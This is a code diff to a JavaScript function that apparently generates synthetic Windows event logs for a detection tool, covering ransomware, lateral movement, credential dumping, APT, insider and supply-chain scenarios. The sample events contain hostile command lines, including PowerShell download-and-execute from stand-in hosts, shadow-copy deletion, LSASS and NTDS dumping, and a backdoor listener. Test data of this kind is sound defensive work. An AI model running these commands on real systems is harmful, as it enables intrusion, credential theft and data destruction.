@@ -448,25 +448,96 @@ router.get('/health', (req, res) => {
 
 // ── Sample event generator ────────────────────────────────────────
 function _generateSampleEvents(scenario) {
-  const base = { Computer: 'WORKSTATION-42', User: 'john.doe', timestamp: new Date() };
+  const now  = Date.now();
+  const ts   = (offset = 0) => new Date(now - offset).toISOString();
+  const base = { Computer: 'WORKSTATION-42', User: 'john.doe' };
+  const dc   = { ...base, Computer: 'DC-01',    User: 'Administrator' };
+  const srv  = { ...base, Computer: 'SERVER-03', User: 'svc_backup' };
 
   const scenarios = {
+    // ── Ransomware kill-chain ──────────────────────────────────
     ransomware: [
-      { ...base, EventID: '4688', Image: 'C:\\Windows\\System32\\cmd.exe', CommandLine: 'cmd.exe /c powershell -EncodedCommand dABlAHMAdAA=', ProcessName: 'cmd.exe' },
-      { ...base, EventID: '1',    Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: 'powershell.exe -EncodedCommand dABlAHMAdAA=' },
-      { ...base, EventID: '12',   TargetObject: 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\malware' },
-      { ...base, EventID: '1',    Image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\payload.exe', CommandLine: 'payload.exe --encrypt C:\\Users' },
-      { ...base, EventID: '4688', Image: 'C:\\Windows\\System32\\vssadmin.exe', CommandLine: 'vssadmin delete shadows /all /quiet', ProcessName: 'vssadmin.exe' },
-      { ...base, EventID: '11',   TargetFilename: 'C:\\Users\\john.doe\\Documents\\report.docx.encrypted' },
+      { ...base, EventID: '4688', timestamp: ts(300000), Image: 'C:\\Windows\\System32\\cmd.exe',
+        CommandLine: 'cmd.exe /c powershell -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj', ProcessName: 'cmd.exe' },
+      { ...base, EventID: '1',    timestamp: ts(280000), Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+        CommandLine: 'powershell.exe -NonInteractive -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj' },
+      { ...base, EventID: '12',   timestamp: ts(260000), TargetObject: 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater32' },
+      { ...base, EventID: '1',    timestamp: ts(240000), Image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost32.exe',
+        CommandLine: 'svchost32.exe --enc C:\\Users --ext .enc' },
+      { ...base, EventID: '4688', timestamp: ts(200000), Image: 'C:\\Windows\\System32\\vssadmin.exe',
+        CommandLine: 'vssadmin delete shadows /all /quiet', ProcessName: 'vssadmin.exe' },
+      { ...base, EventID: '4688', timestamp: ts(180000), Image: 'C:\\Windows\\System32\\wbadmin.exe',
+        CommandLine: 'wbadmin delete catalog -quiet', ProcessName: 'wbadmin.exe' },
+      { ...base, EventID: '11',   timestamp: ts(120000), TargetFilename: 'C:\\Users\\john.doe\\Documents\\budget_2025.xlsx.enc' },
+      { ...base, EventID: '11',   timestamp: ts(100000), TargetFilename: 'C:\\Users\\john.doe\\Desktop\\README_DECRYPT.txt' },
     ],
+
+    // ── Lateral movement ──────────────────────────────────────
     lateral_movement: [
-      { ...base, EventID: '4624', LogonType: '3', AuthPackage: 'NTLM', SourceIp: '192.168.1.50' },
-      { ...base, EventID: '1',    Image: 'C:\\Windows\\System32\\cmd.exe', ParentImage: 'C:\\Windows\\System32\\WmiPrvSE.exe', CommandLine: 'cmd.exe /c whoami' },
-      { ...base, EventID: '4688', Image: 'C:\\Windows\\System32\\net.exe', CommandLine: 'net view /domain', ProcessName: 'net.exe' },
+      { ...base, EventID: '4624', timestamp: ts(500000), LogonType: '3', AuthPackage: 'NTLM', SourceIp: '192.168.1.50', TargetUserName: 'Administrator' },
+      { ...base, EventID: '4688', timestamp: ts(480000), Image: 'C:\\Windows\\System32\\net.exe', CommandLine: 'net view /domain', ProcessName: 'net.exe' },
+      { ...base, EventID: '1',    timestamp: ts(460000), Image: 'C:\\Windows\\System32\\cmd.exe',
+        ParentImage: 'C:\\Windows\\System32\\WmiPrvSE.exe', CommandLine: 'cmd.exe /c whoami && ipconfig /all' },
+      { ...base, EventID: '3',    timestamp: ts(440000), Image: 'C:\\Windows\\System32\\psexec.exe',
+        DestinationIp: '192.168.1.100', DestinationPort: '445' },
+      { ...dc,   EventID: '4624', timestamp: ts(420000), LogonType: '3', SourceIp: '192.168.1.42', TargetUserName: 'Domain Admin' },
+      { ...dc,   EventID: '4688', timestamp: ts(400000), Image: 'C:\\Windows\\System32\\net.exe', CommandLine: 'net group "Domain Admins"' },
+      { ...dc,   EventID: '1',    timestamp: ts(380000), Image: 'C:\\Windows\\Temp\\backdoor.exe', CommandLine: 'backdoor.exe -p 4444 -l' },
     ],
+
+    // ── Credential dump ────────────────────────────────────────
     credential_dump: [
-      { ...base, EventID: '4688', Image: 'C:\\Tools\\procdump64.exe', CommandLine: 'procdump64.exe -ma lsass.exe lsass.dmp' },
-      { ...base, EventID: '4624', LogonType: '9', User: 'Administrator' },
+      { ...base, EventID: '4688', timestamp: ts(300000), Image: 'C:\\Tools\\procdump64.exe',
+        CommandLine: 'procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp', ProcessName: 'procdump64.exe' },
+      { ...base, EventID: '10',   timestamp: ts(280000), SourceImage: 'C:\\Tools\\procdump64.exe',
+        TargetImage: 'C:\\Windows\\System32\\lsass.exe', GrantedAccess: '0x1fffff' },
+      { ...base, EventID: '1',    timestamp: ts(260000), Image: 'C:\\Windows\\System32\\cmd.exe',
+        CommandLine: 'cmd.exe /c reg save HKLM\\SAM C:\\Temp\\sam.hive' },
+      { ...base, EventID: '4624', timestamp: ts(240000), LogonType: '9', User: 'Administrator', SourceIp: '127.0.0.1' },
+      { ...base, EventID: '3',    timestamp: ts(220000), DestinationIp: '185.220.101.45', DestinationPort: '443',
+        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' },
+    ],
+
+    // ── APT Campaign ──────────────────────────────────────────
+    apt: [
+      { ...base, EventID: '1',    timestamp: ts(3600000), Image: 'C:\\Windows\\System32\\mshta.exe',
+        CommandLine: 'mshta.exe http://cdn.update-service.net/flash.hta', ParentImage: 'C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE' },
+      { ...base, EventID: '1',    timestamp: ts(3500000), Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+        ParentImage: 'C:\\Windows\\System32\\mshta.exe', CommandLine: 'powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://cdn.update-service.net/p.ps1\')' },
+      { ...base, EventID: '12',   timestamp: ts(3400000), TargetObject: 'HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit' },
+      { ...base, EventID: '3',    timestamp: ts(3300000), DestinationIp: '104.21.56.203', DestinationPort: '443',
+        Image: 'C:\\Windows\\System32\\svchost.exe' },
+      { ...dc,   EventID: '4672', timestamp: ts(3200000), SubjectUserName: 'john.doe', PrivilegeList: 'SeDebugPrivilege' },
+      { ...dc,   EventID: '4688', timestamp: ts(3100000), Image: 'C:\\Windows\\System32\\ntdsutil.exe',
+        CommandLine: 'ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q' },
+      { ...dc,   EventID: '3',    timestamp: ts(3000000), DestinationIp: '185.220.101.34', DestinationPort: '80',
+        Image: 'C:\\Windows\\System32\\certutil.exe' },
+    ],
+
+    // ── Insider Threat ────────────────────────────────────────
+    insider: [
+      { ...base, EventID: '4688', timestamp: ts(7200000), Image: 'C:\\Program Files\\7-Zip\\7z.exe',
+        CommandLine: '7z.exe a -tzip C:\\Users\\john.doe\\AppData\\Local\\Temp\\data.zip C:\\CorpData\\HR\\*' },
+      { ...base, EventID: '3',    timestamp: ts(7100000), DestinationIp: '104.18.32.71', DestinationPort: '443',
+        Image: 'C:\\Users\\john.doe\\AppData\\Roaming\\Dropbox\\Client\\Dropbox.exe' },
+      { ...base, EventID: '4663', timestamp: ts(7000000), ObjectName: 'C:\\CorpData\\IP\\design_specs_v3.pdf', ObjectType: 'File' },
+      { ...base, EventID: '4663', timestamp: ts(6900000), ObjectName: 'C:\\CorpData\\Finance\\Q4_projections.xlsx', ObjectType: 'File' },
+      { ...srv,  EventID: '4720', timestamp: ts(6800000), TargetUserName: 'temp_backup_svc', SubjectUserName: 'john.doe' },
+      { ...base, EventID: '4688', timestamp: ts(6700000), Image: 'C:\\Windows\\System32\\xcopy.exe',
+        CommandLine: 'xcopy /s /e C:\\CorpData\\Source E:\\External\\backup', ProcessName: 'xcopy.exe' },
+    ],
+
+    // ── Supply Chain ──────────────────────────────────────────
+    supply_chain: [
+      { ...base, EventID: '1',    timestamp: ts(86400000), Image: 'C:\\Program Files\\NodeJS\\npm.exe',
+        CommandLine: 'npm install lodash-utils-extra@3.1.2' },
+      { ...base, EventID: '1',    timestamp: ts(86300000), Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+        ParentImage: 'C:\\Program Files\\NodeJS\\node.exe',
+        CommandLine: 'powershell -NonI -w Hidden -c [System.Net.WebClient]::new().DownloadFile(\'http://upd8.cc/agent\',\'C:\\Temp\\a.exe\')' },
+      { ...base, EventID: '1',    timestamp: ts(86200000), Image: 'C:\\Temp\\a.exe', CommandLine: 'a.exe --install --silent' },
+      { ...base, EventID: '12',   timestamp: ts(86100000), TargetObject: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\Debugger' },
+      { ...base, EventID: '3',    timestamp: ts(86000000), DestinationIp: '45.142.212.100', DestinationPort: '8080',
+        Image: 'C:\\Temp\\a.exe' },
     ],
   };
 
